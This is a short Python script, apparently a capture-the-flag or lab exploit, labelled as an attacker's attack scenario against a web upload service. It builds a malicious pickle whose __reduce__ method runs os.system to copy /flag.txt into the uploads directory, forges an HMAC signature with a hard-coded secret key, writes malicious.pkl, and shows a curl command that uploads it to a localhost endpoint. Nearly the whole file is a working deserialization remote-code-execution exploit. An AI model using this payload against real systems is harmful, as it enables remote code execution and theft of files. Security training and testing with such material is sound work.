# Attack scenario (test)
# this is the script file which the attacker uses in his local PC
import pickle, os, hashlib, hmac

UPLOAD_DIR = "/app/app/uploads"
uuid = "ab8ba41e-53a8-4b35-8e0b-fbfd4cbafaf8"

class RCE:
    def __reduce__(self):
        return (os.system, (f"cat /flag.txt > {UPLOAD_DIR}/{uuid}/hacked.txt",))

SECRET_KEY = "pickle_tickle"
payload = pickle.dumps(RCE())
sig = hmac.new(SECRET_KEY.encode(), payload, hashlib.sha256).hexdigest()

with open("malicious.pkl", "wb") as f:
    f.write(payload)

print(f"HMAC signature: {sig}")

# hacker then uploads the malicious.pkl file on the website
'''
curl -X POST http://localhost:916/upload \
  -F "file=@malicious.pkl" \
  -F "sig=7547b3173b1ce073d4a99658ea4cf95ad053f7180176cf84d8f2254be41d5430"  # requires correct sig here
'''